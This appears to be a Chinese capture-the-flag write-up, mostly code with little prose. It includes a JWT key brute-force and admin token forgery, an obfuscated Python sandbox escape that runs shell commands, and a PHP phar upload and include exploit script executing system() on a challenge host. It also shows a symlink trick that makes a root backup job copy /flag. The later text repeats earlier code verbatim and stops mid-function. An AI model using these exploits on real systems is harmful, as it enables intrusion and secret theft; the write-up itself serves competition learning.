# 2025湾区杯网络安全竞赛WriteUP

> 原文: https://www.ctfiot.com/269807.html
> ID: 269807

拿到源码：

<?phpclass SM4 {    const ENCRYPT = 1;    private $sk;     private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];    private static $CK = [        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279    ];    private static $SboxTable = [        0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,        0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,        0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,        0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,        0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,        0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,        0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC,        0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27,        0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C,        0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD,        0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7,        0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40,        0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08,        0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA,        0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F,        0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33    ];
    public function __construct($key) {        $this->setKey($key);    }    public function setKey($key) {        if (strlen($key) != 16) {            throw new Exception("SM4");        }        $key = $this->strToIntArray($key);        $k = array_merge($key, [0, 0, 0, 0]);        for ($i = 0; $i < 4; $i++) {            $k[$i] ^= self::$FK[$i];        }        for ($i = 0; $i < 32; $i++) {            $k[$i + 4] = $k[$i] ^ $this->CKF($k[$i + 1], $k[$i + 2], $k[$i + 3], self::$CK[$i]);            $this->sk[$i] = $k[$i + 4];        }    }    public function encrypt($plaintext) {        $len = strlen($plaintext);        $padding = 16 - ($len % 16);        $plaintext .= str_repeat(chr($padding), $padding);         $ciphertext = '';        for ($i = 0; $i < strlen($plaintext); $i += 16) {            $block = substr($plaintext, $i, 16);            $ciphertext .= $this->cryptBlock($block, self::
ENCRYPT);        }        return $ciphertext;    }    private function cryptBlock($block, $mode) {        $x = $this->strToIntArray($block);
        for ($i = 0; $i < 32; $i++) {            $roundKey = $this->sk[$i];            $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);            array_shift($x);        }        $x = array_reverse($x);        return $this->intArrayToStr($x);    }    private function F($x1, $x2, $x3, $rk) {        return $this->T($x1 ^ $x2 ^ $x3 ^ $rk);    }    private function CKF($a, $b, $c, $ck) {        return $a ^ $this->T($b ^ $c ^ $ck);    }    private function T($x) {        return $this->L($this->S($x));    }    private function S($x) {        $result = 0;        for ($i = 0; $i < 4; $i++) {            $byte = ($x >> (24 - $i * 8)) & 0xFF;            $result |= self::$SboxTable[$byte] << (24 - $i * 8);        }        return $result;    }    private function L($x) {        return $x ^ $this->rotl($x, 2) ^ $this->rotl($x, 10) ^ $this->rotl($x, 18) ^ $this->rotl($x, 24);    }    private function rotl($x, $n) {        return (($x << $n) & 0xFFFFFFFF) | (($x >> (32 - $n)) & 0xFFFFFFFF);    }    private function strToIntArray($str) {        $result = [];        for ($i = 0; $i < 4; $i++) {            $offset = $i * 4;            $result[$i] =                (ord($str[$offset]) << 24) |                (ord($str[$offset + 1]) << 16) |                (ord($str[$offset + 2]) << 8) |                ord($str[$offset + 3]);        }        return $result;    }    private function intArrayToStr($array) {        $str = '';        foreach ($array as $int) {            $str .= chr(($int >> 24) & 0xFF);            $str .= chr(($int >> 16) & 0xFF);            $str .= chr(($int >> 8) & 0xFF);            $str .= chr($int & 0xFF);        }        return $str;    }}try {    $key = "a8a58b78f41eeb6a";    $sm4 = new SM4($key);    $plaintext = "flag";    $ciphertext = $sm4->encrypt($plaintext);    echo  base64_encode($ciphertext) ; //VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu} catch (Exception $e) {    echo $e->getMessage() ;}?>

public function decrypt($ciphertext) {    $plaintext = '';    for ($i = 0; $i < strlen($ciphertext); $i += 16) {        $block = substr($ciphertext, $i, 16);        $plaintext .= $this->cryptBlockDecrypt($block);    }    // 去填充    $padding = ord(substr($plaintext, -1));    return substr($plaintext, 0, -$padding);}
private function cryptBlockDecrypt($block) {    $x = $this->strToIntArray($block);    for ($i = 0; $i < 32; $i++) {        $roundKey = $this->sk[31 - $i]; // 关键点：倒序        $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);        array_shift($x);    }    $x = array_reverse($x);    return $this->intArrayToStr($x);}

$key = "a8a58b78f41eeb6a";$sm4 = new SM4($key);$cipher_b64 = "VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu";$cipher = base64_decode($cipher_b64);
$plain = $sm4->decrypt($cipher);

func main() {	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"// 遍历所有 2 位组合for i := 0; i < len(charset); i++ {for j := 0; j < len(charset); j++ { combination := string(charset[i]) + string(charset[j])if check(combination) { fmt.Println(combination)return } }	}}func check(letter string) bool {	token, err := jwt.Parse("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E", func(token *jwt.Token) (interface{}, error) {if token.Method != jwt.SigningMethodHS256 {return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"]) }return []byte("@o70xO$0%#qR9#" + letter), nil	})
if err != nil { fmt.Println("Error parsing token:", err)return false	}
if _, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {return true	} else {return false	}}

// 定义一个 secret key（生产环境要放在安全位置）var jwtKey = []byte("@o70xO$0%#qR9#m0")
func main() {// 定义 Claims（有效负载中存储用户信息及过期时间）	claims := jwt.MapClaims{"username": "admin","role":     "admin",	}
// 使用 HMAC SHA256 算法生成 token	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
// 使用密钥签名	tokenString, err := token.SignedString(jwtKey)if err != nil {panic(err)	}
	fmt.Println("Generated Token:", tokenString)}

def run():      return "test"

def run():    b = char(95)*2 + "builtins" + chr(95)*2    aaa = globals()[b]
    bbb = chr(95)*2 + "imp" + "ort" + chr(95)*2    imp = aaa[bbb]    ccc = imp("o"+"s")    ddd = chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)    return getattr(ccc, ddd)("cat /fl11lag >/tmp/aaa")

def run():    b = chr(95)*2 + "builtins" + chr(95)*2    bbb = globals()[b]    xxx = chr(111)+chr(112)+chr(101)+chr(110)    f = bbb[xxx]("/tmp/aaa","r")
    aaa = chr(114)+chr(101)+chr(97)+chr(100)    content = getattr(f,aaa)()    return content

from hashlib import *from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom secrets import flag, secret
assert secret < 2 ** 50p = 115792089237316195423570985008687907853269984665640564039457584007913129639747Q_components = (123456789, 987654321, 135792468, 864297531)
class Quaternion:    def __init__(self, a, b, c, d):        self.p = p        self.a = a % self.p        self.b = b % self.p        self.c = c % self.p        self.d = d % self.p
    def __repr__(self):        return f"Q({self.a}, {self.b}, {self.c}, {self.d})"
    def __mul__(self, other):        a1, b1, c1, d1 = self.a, self.b, self.c, self.d        a2, b2, c2, d2 = other.a, other.b, other.c, other.d        a_new = a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2        b_new = a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2        c_new = a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2        d_new = a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2        return Quaternion(a_new, b_new, c_new, d_new)
def power(base_quat, exp):    res = Quaternion(1, 0, 0, 0)    base = base_quat    while exp > 0:        if exp % 2 == 1:            res = res * base        base = base * base        exp //= 2    return res
Q = Quaternion(*Q_components)R = power(Q,secret)
print("--- Public Parameters ---")print(f"p = {p}")print(f"Q = {Q}")print(f"R = {R}")
'''--- Public Parameters ---p = 115792089237316195423570985008687907853269984665640564039457584007913129639747Q = Q(123456789, 987654321, 135792468, 864297531)R = Q(53580504271939954579696282638160058429308301927753139543147605882574336327145, 79991318245209837622945719467562796951137605212294979976479199793453962090891, 53126869889181040587037210462276116096032594677560145306269148156034757160128, 97368024230306399859522783292246509699830254294649668434604971213496467857155)'''
key = md5(str(secret).encode()).hexdigest().encode()cipher = AES.new(key=key,mode=AES.MODE_ECB)print(cipher.encrypt(pad(flag,16)))
# b'(xe4IJxfd4%xcfxadxb4x7fixaexdbZux6-xf4xd72x14BBx1exdcxb7xb7xd1xad#e@x17x1fx12xc4xe5xa6x10x91x08xd6x87x82Hx9e'

from hashlib import md5from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport mathfrom collections import defaultdict
# ---------------- Public parameters ----------------p = 115792089237316195423570985008687907853269984665640564039457584007913129639747Q_components = (123456789, 987654321, 135792468, 864297531)R_components = (    53580504271939954579696282638160058429308301927753139543147605882574336327145,    79991318245209837622945719467562796951137605212294979976479199793453962090891,    53126869889181040587037210462276116096032594677560145306269148156034757160128,    97368024230306399859522783292246509699830254294649668434604971213496467857155)
ciphertext = b'(xe4IJxfd4%xcfxadxb4x7fixaexdbZux6-xf4xd72x14BBx1exdcxb7xb7xd1xad#e@x17x1fx12xc4xe5xa6x10x91x08xd6x87x82Hx9e'
# ---------------- Quaternion arithmetic ----------------class Quaternion:    __slots__=("a","b","c","d")    def __init__(self,a,b,c,d):        self.a=a%p;self.b=b%p;self.c=c%p;self.d=d%p    def __mul__(self,other):        a1,b1,c1,d1 = self.a,self.b,self.c,self.d        a2,b2,c2,d2 = other.a,other.b,other.c,other.d        return Quaternion(            (a1*a2 - b1*b2 - c1*c2 - d1*d2)%p,            (a1*b2 + b1*a2 + c1*d2 - d1*c2)%p,            (a1*c2 - b1*d2 + c1*a2 + d1*b2)%p,            (a1*d2 + b1*c2 - c1*b2 + d1*a2)%p        )    def __eq__(self,other): return (self.a,self.b,self.c,self.d)==(other.a,other.b,other.c,other.d)    def __hash__(self): return hash((self.a,self.b,self.c,self.d))    def conjugate(self):        return Quaternion(self.a,-self.b,-self.c,-self.d)    def norm(self):        return (self.a*self.a + self.b*self.b + self.c*self.c + self.d*self.d) % p    def inverse(self):        n=self.norm()        n_inv=pow(n,-1,p)        qc=self.conjugate()        return Quaternion(qc.a*n_inv, qc.b*n_inv, qc.c*n_inv, qc.d*n_inv)
def power(base,exp):    res = Quaternion(1,0,0,0)    while exp>0:        if exp&1: res=res*base        base=base*base        exp//=2    return res
Q=Quaternion(*Q_components)R=Quaternion(*R_components)
# ---------------- Optimized BSGS ----------------def bsgs(base, target, bound):    m=int(math.isqrt(bound))+1    baby={}    cur=Quaternion(1,0,0,0)    for j in range(m):        # 存储时只存 tuple，避免 Quaternion 对象占内存        baby[(cur.a,cur.b,cur.c,cur.d)]=j        cur=cur*base        if j%500000==0 and j>0:            print(f"[*] Baby step {j}/{m}")    # giant step    factor = power(base.inverse(), m)    cur=target    for i in range(m+1):        t=(cur.a,cur.b,cur.c,cur.d)        if t in baby:            return i*m+baby[t]        cur=cur*factor        if i%100000==0 and i>0:            print(f"[*] Giant step {i}/{m}")    return None
# ---------------- Run ----------------N=1<<50secret=bsgs(Q,R,N)print("[+] Found secret:",secret)
# ---------------- Decrypt ----------------key=md5(str(secret).encode()).hexdigest().encode()cipher=AES.new(key,AES.MODE_ECB)plaintext=unpad(cipher.decrypt(ciphertext),16)print("[+] FLAG:",plaintext.decode())

byte_2120 = [    0x97,0xD5,0x60,0x43,0xB4,0x10,0x43,0x73,    0x0F,0xDA,0x43,0xCD,0xD3,0xE8,0x73,0x4A,    0x94,0xC3,0xCD,0x71,0xBD,0xDC,0x97,0x1A]
def rol(x, r, bits=8):    return ((x << r) & (2**bits-1)) | (x >> (bits-r))
def ror(x, r, bits=8):    return ((x >> r) | ((x << (bits-r)) & (2**bits-1)))
def sub_12A9(a1, a2):  # 左循环移位    return rol(a1, a2, 8)
def sub_12DE(a1, a2):  # 右循环移位    return ror(a1, a2, 8)
def sub_1313(a1):    if a1 == 0:        return 0    v2 = 1    v3 = 255    v4 = a1    while v3:        if v3 & 1:            v2 = (v4 * v2) % 257        v4 = (v4 * v4) % 257        v3 >>= 1    return v2
byte_2020 = [  0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,  0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,  0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,  0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,  0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,  0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,  0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,  0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,  0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,  0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,  0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,  0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,  0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,  0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,  0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,  0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,  0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,  0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,  0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,  0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,  0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,  0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,  0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,  0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,  0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,  0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,  0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,  0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,  0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,  0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,  0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,  0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16,]
def sub_13E1(a1):    # Step1 XOR 0x5A    t1 = a1 ^ 0x5A    # Step2 ROL3    v1 = sub_12A9(t1, 3)    # Step3 nibble mix    hi = (v1 >> 4) & 0xF    lo = v1 & 0xF    t = ((3 * hi) & 0xF) << 4 | ((5 * lo) & 0xF)    # Step4 mod 257 pow    v3 = sub_1313(t)    # Step5 ror2    idx = sub_12DE(v3, 2) & 0xFF    # Step6 lookup S-box    return byte_2020[idx]
def invert_table():    mapping = {}    for x in range(256):        y = sub_13E1(x)        mapping[y] = x    return mapping
mapping = invert_table()
flag_bytes = []for b in byte_2120:    if b in mapping:        flag_bytes.append(mapping[b])    else:        flag_bytes.append(ord('?'))  # 未找到情况(理论上不会)
def ror(x, r, bits=8):    return ((x >> r) | ((x << (bits-r)) & (2**bits-1))) & 0xFF
# mapping 已生成，byte_2120 已提取
flag_bytes = []for i, b in enumerate(byte_2120):    tmp = mapping[b]         # 得到 sub_1492 的输出    k = (i % 7) + 1    orig = ror(tmp, k)       # 逆 sub_1492    flag_bytes.append(orig)
print(bytes(flag_bytes))

<?phphighlight_file(__FILE__);
function waf($data){    if (is_array($data)){        die("Cannot transfer arrays");    }    if (preg_match('/<?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i', $data)) {        die("You can't do");    }}
class Coral{    public $pivot;
    public function __set($k, $value) {        $k = $this->pivot->ctor;        echo new $k($value);    }}
class Nimbus{    public $handle;    public $ctor;
    public function __destruct() {        return $this->handle();    }    public function __call($name, $arg){        $arg[1] = $this->handle->$name;    }}
class Zephyr{    public $target;    public $payload;    public function __get($prop)    {        $this->target->$prop = $this->payload;    }}
class Acheron {    public $mode;
    public function __destruct(){        $data = $_POST[0];        if ($this->mode == 'w') {            waf($data);            $filename = "/tmp/".md5(rand()).".phar";            file_put_contents($filename, $data);            echo $filename;        } else if ($this->mode == 'r') {            waf($data);            $f = include($data);            if($f){                echo "It is file";            }            else{                echo "You can look at the others";            }        }    }}
if(strlen($_POST[1]) < 52) {    $a = unserialize($_POST[1]);}else{    echo "str too long";}
?>

<?phpini_set('phar.readonly', 0);// 生成PHAR文件@unlink("exp.phar");@unlink("exp.phar.gz");$phar = new Phar("exp.phar");$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>");$phar->addFromString("ls",'<?php system("ls -la /"); ?>');$phar->stopBuffering();$phar->compress(Phar::GZ);
echo "PHAR file generated successfullyn";?>

<?php$target = "http://web-6b7ebd8df7.challenge.xctf.org.cn/"; // ★ 改成题目地址
// // 第一次：上传 phar 文件$ch = curl_init();$post = [    "0" => file_get_contents("exp.phar.gz"),//new CURLFile("exp.phar", "application/octet-stream", "exp.phar"),    // 注意这里用 serialize 构造 Acheron 对象    "1" => 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}'];curl_setopt_array($ch, [    CURLOPT_URL => $target,    CURLOPT_RETURNTRANSFER => true,    CURLOPT_POST => true,    CURLOPT_POSTFIELDS => $post]);
$response = curl_exec($ch);curl_close($ch);
echo "[*] Upload response:n$responsen";
// 从返回中提取 /tmp/xxx.phar 路径if (preg_match("#(/tmp/[0-9a-f]+.phar)#", $response, $m)) {    $phar_path = $m[1];    echo "[*] Got phar path: $phar_pathn";
    // 第二次：触发 include    $ch = curl_init();    $post2 = [        "0" => 'phar://'.$phar_path."/ls",        "1" => 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}'    ];    curl_setopt_array($ch, [        CURLOPT_URL => $target,        CURLOPT_RETURNTRANSFER => true,        CURLOPT_POST => true,        CURLOPT_POSTFIELDS => $post2    ]);    $resp2 = curl_exec($ch);    curl_close($ch);
    echo "[*] Trigger response:n$resp2n";}

发现一个备份文件，且运行用户为root，尝试通过软连接的方式，将/flag拷贝到backup下。

>/var/www/html/-L # 创建一个-L文件，达到cp -P -L /var/www/html/backup/的目的ln -s /flag /var/www/html/zzzls -la /var/www/html/backup

cat /var/www/html/backup/zzz


```
<?phpclass SM4 {    const ENCRYPT = 1;    private $sk;     private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];    private static $CK = [        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279    ];    private static $SboxTable = [        0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,        0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,        0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,        0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,        0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,        0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,        0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC,        0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27,        0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C,        0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD,        0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7,        0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40,        0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08,        0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA,        0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F,        0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33    ];
    public function __construct($key) {        $this->setKey($key);    }    public function setKey($key) {        if (strlen($key) != 16) {            throw new Exception("SM4");        }        $key = $this->strToIntArray($key);        $k = array_merge($key, [0, 0, 0, 0]);        for ($i = 0; $i < 4; $i++) {            $k[$i] ^= self::$FK[$i];        }        for ($i = 0; $i < 32; $i++) {            $k[$i + 4] = $k[$i] ^ $this->CKF($k[$i + 1], $k[$i + 2], $k[$i + 3], self::$CK[$i]);            $this->sk[$i] = $k[$i + 4];        }    }    public function encrypt($plaintext) {        $len = strlen($plaintext);        $padding = 16 - ($len % 16);        $plaintext .= str_repeat(chr($padding), $padding);         $ciphertext = '';        for ($i = 0; $i < strlen($plaintext); $i += 16) {            $block = substr($plaintext, $i, 16);            $ciphertext .= $this->cryptBlock($block, self::
ENCRYPT);        }        return $ciphertext;    }    private function cryptBlock($block, $mode) {        $x = $this->strToIntArray($block);
        for ($i = 0; $i < 32; $i++) {            $roundKey = $this->sk[$i];            $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);            array_shift($x);        }        $x = array_reverse($x);        return $this->intArrayToStr($x);    }    private function F($x1, $x2, $x3, $rk) {        return $this->T($x1 ^ $x2 ^ $x3 ^ $rk);    }    private function CKF($a, $b, $c, $ck) {        return $a ^ $this->T($b ^ $c ^ $ck);    }    private function T($x) {        return $this->L($this->S($x));    }    private function S($x) {        $result = 0;        for ($i = 0; $i < 4; $i++) {            $byte = ($x >> (24 - $i * 8)) & 0xFF;            $result |= self::$SboxTable[$byte] << (24 - $i * 8);        }        return $result;    }    private function L($x) {        return $x ^ $this->rotl($x, 2) ^ $this->rotl($x, 10) ^ $this->rotl($x, 18) ^ $this->rotl($x, 24);    }    private function rotl($x, $n) {        return (($x << $n) & 0xFFFFFFFF) | (($x >> (32 - $n)) & 0xFFFFFFFF);    }    private function strToIntArray($str) {        $result = [];        for ($i = 0; $i < 4; $i++) {            $offset = $i * 4;            $result[$i] =                (ord($str[$offset]) << 24) |                (ord($str[$offset + 1]) << 16) |                (ord($str[$offset + 2]) << 8) |                ord($str[$offset + 3]);        }        return $result;    }    private function intArrayToStr($array) {        $str = '';        foreach ($array as $int) {            $str .= chr(($int >> 24) & 0xFF);            $str .= chr(($int >> 16) & 0xFF);            $str .= chr(($int >> 8) & 0xFF);            $str .= chr($int & 0xFF);        }        return $str;    }}try {    $key = "a8a58b78f41eeb6a";    $sm4 = new SM4($key);    $plaintext = "flag";    $ciphertext = $sm4->encrypt($plaintext);    echo  base64_encode($ciphertext) ; //VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu} catch (Exception $e) {    echo $e->getMessage() ;}?>
public function decrypt($ciphertext) {    $plaintext = '';    for ($i = 0; $i < strlen($ciphertext); $i += 16) {        $block = substr($ciphertext, $i, 16);        $plaintext .= $this->cryptBlockDecrypt($block);    }    // 去填充    $padding = ord(substr($plaintext, -1));    return substr($plaintext, 0, -$padding);}
private function cryptBlockDecrypt($block) {    $x = $this->strToIntArray($block);    for ($i = 0; $i < 32; $i++) {        $roundKey = $this->sk[31 - $i]; // 关键点：倒序        $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);        array_shift($x);    }    $x = array_reverse($x);    return $this->intArrayToStr($x);}
$key = "a8a58b78f41eeb6a";$sm4 = new SM4($key);$cipher_b64 = "VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu";$cipher = base64_decode($cipher_b64);
$plain = $sm4->decrypt($cipher);
func main() {	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"// 遍历所有 2 位组合for i := 0; i < len(charset); i++ {for j := 0; j < len(charset); j++ { combination := string(charset[i]) + string(charset[j])if check(combination) { fmt.Println(combination)return } }	}}func check(letter string) bool {	token, err := jwt.Parse("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E", func(token *jwt.Token) (interface{}, error) {if token.Method != jwt.SigningMethodHS256 {return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"]) }return []byte("@o70xO$0%#qR9#" + letter), nil	})
if err != nil { fmt.Println("Error parsing token:", err)return false	}
if _, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {return true	} else {return false	}}
// 定义一个 secret key（生产环境要放在安全位置）var jwtKey = []byte("@o70xO$0%#qR9#m0")
func main() {// 定义 Claims（有效负载中存储用户信息及过期时间）	claims := jwt.MapClaims{"username": "admin","role":     "admin",	}
